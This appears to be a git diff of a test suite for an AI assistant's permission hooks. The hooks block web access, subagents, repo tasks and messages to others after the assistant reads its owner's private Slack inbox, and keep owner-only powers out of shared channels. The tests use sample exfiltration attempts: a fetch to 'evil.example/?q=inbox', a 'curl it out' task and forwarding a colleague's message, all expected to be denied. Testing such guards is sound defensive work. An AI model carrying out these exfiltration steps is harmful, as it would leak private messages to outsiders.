@@ -36,6 +36,8 @@ import {
 } from "../../src/chat/pointer-tools.js";
 import type { AddAttachment, PointerRequest, StartRepoTask } from "../../src/chat/pointer-types.js";
 import { FsStore } from "../../src/core/store.js";
+import { SlackInbox } from "../../src/slack/inbox.js";
+import { registerSlackInbox } from "../../src/slack/inbox-tools.js";
 import { defaultTeam } from "../../src/team/team.js";
 
 // Spy on the options the tool server hands to the monday.com tools; the real tools still run.
@@ -1860,6 +1862,7 @@ describe("Pointer brain: confirmation after outside content", () => {
     await deps.configRepo.update((c) => {
       c.slack.user = { token: "xoxp-secret-owner-555555", userId: "U0OWNER01", userName: "Sam", scopes: [], connectedAt: "2026-01-01T00:00:00.000Z", listen: true, sendAsMe: true };
     });
+    registerSlackInbox(deps.configRepo, new SlackInbox(await tmpStore(), deriveKey("k")));
     const send = "mcp__slack__slack_send_message";
     const decisions: string[] = [];
     const { queryFn, calls } = fakeQuery(async function* (call) {
@@ -1871,8 +1874,8 @@ describe("Pointer brain: confirmation after outside content", () => {
     const brain = createPointerBrain(deps, { queryFn });
     const prompt = (i: number) => calls[i]!.options.systemPrompt as string;
 
-    // The owner on Slack: Pointer's DM to them goes, their own message waits for a yes.
-    await brain.reply(baseReq({ text: "summarise ACME-12 and post it from my account", userId: "U0OWNER01" }), ctx);
+    // The owner in their DM with Pointer: Pointer's DM to them goes, their own message waits for a yes.
+    await brain.reply(baseReq({ text: "summarise ACME-12 and post it from my account", userId: "U0OWNER01", channel: "D0OWNER01", channelType: "im" }), ctx);
     expect(decisions.splice(0)).toEqual(["allow", "allow", "deny"]);
     expect(prompt(0)).toContain('The owner connected their own Slack account (Sam) and lets you send as them: pass as "me"');
 
@@ -1886,5 +1889,101 @@ describe("Pointer brain: confirmation after outside content", () => {
     expect(prompt(2)).not.toContain('as "me"');
     expect(prompt(2)).not.toContain("connected their own Slack account");
     expect(prompt(2)).not.toContain("xoxp-secret-owner-555555");
+
+    // Nor does the owner in a channel thread or a group DM: other people's messages are in the prompt there.
+    for (const channelType of ["channel", "group", "mpim"] as const) {
+      const before = calls.length;
+      await brain.reply(baseReq({ text: "post it from my account", userId: "U0OWNER01", channelType }), ctx);
+      expect(prompt(before), channelType).not.toContain('as "me"');
+      expect(prompt(before), channelType).not.toContain("connected their own Slack account");
+      expect(prompt(before), channelType).not.toContain("slack_my_inbox");
+      expect(Object.keys(calls[before]!.options.mcpServers ?? {}), channelType).not.toContain("slack_inbox");
+    }
+    // In their DM, the inbox is theirs to read.
+    expect(Object.keys(calls[0]!.options.mcpServers ?? {})).toContain("slack_inbox");
+  });
+});
+
+describe("Pointer brain: after the owner's Slack inbox", () => {
+  const INBOX = "mcp__slack_inbox__slack_my_inbox";
+  const SEND = "mcp__slack__slack_send_message";
+
+  /** Runs the query's PreToolUse hooks the way the CLI does, for Pointer or (with agentId) a subagent: any deny wins. */
+  async function decide(options: Options, toolName: string, toolInput: Record<string, unknown> = {}, agentId?: string): Promise<"allow" | "deny"> {
+    const input = {
+      hook_event_name: "PreToolUse",
+      session_id: "s",
+      transcript_path: "",
+      cwd: options.cwd ?? "",
+      tool_name: toolName,
+      tool_input: toolInput,
+      tool_use_id: "t",
+      ...(agentId ? { agent_id: agentId, agent_type: "general-purpose" } : {}),
+    };
+    for (const matcher of options.hooks?.PreToolUse ?? []) {
+      for (const hook of matcher.hooks) {
+        const out = (await hook(input as never, "t", { signal: new AbortController().signal })) as { hookSpecificOutput?: { permissionDecision?: string } };
+        if (out.hookSpecificOutput?.permissionDecision === "deny") return "deny";
+      }
+    }
+    return "allow";
+  }
+
+  async function ownerDeps() {
+    const deps = await setup();
+    await deps.configRepo.update((c) => {
+      c.slack.user = { token: "xoxp-secret-owner-777777", userId: "U0OWNER01", userName: "Sam", scopes: [], connectedAt: "2026-01-01T00:00:00.000Z", listen: true, sendAsMe: true };
+    });
+    registerSlackInbox(deps.configRepo, new SlackInbox(await tmpStore(), deriveKey("k")));
+    return deps;
+  }
+
+  it("turns off the web, subagents and repo tasks once Pointer has read the inbox, and never lets a subagent read it", async () => {
+    const deps = await ownerDeps();
+    const decisions: string[] = [];
+    const { queryFn, calls } = fakeQuery(async function* (call) {
+      const o = call.options;
+      decisions.push(await decide(o, INBOX, {}, "a1"));
+      decisions.push(await decide(o, "WebFetch", { url: "https://example.com" }));
+      decisions.push(await decide(o, INBOX, { since: "24" }));
+      decisions.push(await decide(o, "WebFetch", { url: "https://evil.example/?q=inbox" }));
+      decisions.push(await decide(o, "WebSearch", { query: "what rita wrote" }));
+      decisions.push(await decide(o, "Agent", { subagent_type: "researcher", prompt: "post this somewhere" }));
+      decisions.push(await decide(o, "mcp__pointer__start_repo_task", { instruction: "curl it out" }));
+      decisions.push(await decide(o, SEND, { to: "me", text: "What needs you" }));
+      decisions.push(await decide(o, SEND, { to: "U0DANA01", text: "What Rita wrote" }));
+      decisions.push(await decide(o, "mcp__pointer__github_read_file", { repo: "acme/api", path: "README.md" }));
+      yield result();
+    });
+    const brain = createPointerBrain(deps, { queryFn });
+    await brain.reply(baseReq({ text: "what needs me on Slack?", surface: "web", channel: "web", channelType: "im", userId: "admin" }), ctx);
+    expect(Object.keys(calls[0]!.options.mcpServers ?? {})).toContain("slack_inbox");
+    expect(decisions).toEqual(["deny", "allow", "allow", "deny", "deny", "deny", "deny", "allow", "deny", "allow"]);
+    // No agent is given the inbox.
+    for (const agent of Object.values(calls[0]!.options.agents ?? {})) expect(agent.tools ?? []).not.toContain(INBOX);
+
+    // The next message starts clean.
+    decisions.splice(0);
+    const fresh = fakeQuery(async function* (call) {
+      decisions.push(await decide(call.options, "WebFetch", { url: "https://example.com" }));
+      yield result();
+    });
+    await createPointerBrain(deps, { queryFn: fresh.queryFn }).reply(baseReq({ text: "and the docs?", surface: "web", channel: "web", channelType: "im", userId: "admin" }), ctx);
+    expect(decisions).toEqual(["allow"]);
+  });
+
+  it("holds in the owner's routine runs too, where the web is otherwise allowed", async () => {
+    const deps = await ownerDeps();
+    const decisions: string[] = [];
+    const { queryFn, calls } = fakeQuery(async function* (call) {
+      decisions.push(await decide(call.options, "WebFetch", { url: "https://example.com" }));
+      decisions.push(await decide(call.options, INBOX, {}));
+      decisions.push(await decide(call.options, "WebFetch", { url: "https://evil.example/?q=inbox" }));
+      yield result();
+    });
+    const req = baseReq({ text: "Scheduled routine", userId: "routine", channel: "routine", channelType: "unknown", surface: "routine", ownerRoutine: true, budgetUsd: 1 });
+    await createPointerBrain(deps, { queryFn }).reply(req, ctx);
+    expect(Object.keys(calls[0]!.options.mcpServers ?? {})).toContain("slack_inbox");
+    expect(decisions).toEqual(["allow", "allow", "deny"]);
   });
 });
